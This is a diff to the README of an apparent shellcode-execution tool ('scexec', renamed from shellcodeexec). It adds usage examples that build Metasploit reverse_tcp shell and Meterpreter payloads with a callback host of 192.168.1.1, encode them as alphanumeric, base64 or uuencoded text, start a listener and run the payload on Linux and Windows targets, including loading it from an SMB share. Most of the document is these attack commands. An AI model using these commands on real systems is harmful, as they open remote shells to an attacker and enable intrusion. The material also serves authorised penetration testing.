@@ -18,13 +18,55 @@ Examples
 
     $ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
     $ msfcli multi/handler PAYLOAD=linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
-    $ ./shellcodeexec <msfencode's alphanumeric-encoded payload>
+    $ ./scexec <msfencode's alphanumeric-encoded payload>
 
 ## Windows target
 
     msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
     msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 E
-    C:\>shellcodeexec.exe <msfencode's alphanumeric-encoded payload>
+    C:\> scexec.exe <msfencode's alphanumeric-encoded payload>
+
+## Windows target with base64
+
+    msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 R | perl utils/base64encode.pl
+    msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 E
+    C:\> scexec.exe b <msfpayload-base64encoded-payload>
+
+## Linux target with uudecode/uuencode
+
+    $ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 R | perl utils/uuencode.pl
+    $ msfcli multi/handler PAYLOAD=linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
+    $ ./scexec u <msfpayload-uuencoded-payload>
+
+## Few more quick examples
+
+Read payload from filename msfpayloadfn:
+
+    C:\> scexec.exe f <msfpayloadfn>
+
+Read base64 encoded payload from filename msfpayloadfn:
+
+    C:\> scexec.exe fb <msfpayloadfn>
+
+Read base64 payload from share:
+
+    C:\> \\192.168.1.1\\scexec.exe f \\192.168.1.1\\msfpayload.raw
+
+Options explained
+=================
+
+Options can be combined:
+
+no options - read alphanumeric shellcode from commandline
+
+a - execute shellcode through call eax/rax
+
+f - read shellcode from file
+
+b - treat input shellcode as base64 encoded
+
+u - treat input shellcode as uuencoded shellcode
+
 
 Building
 ========
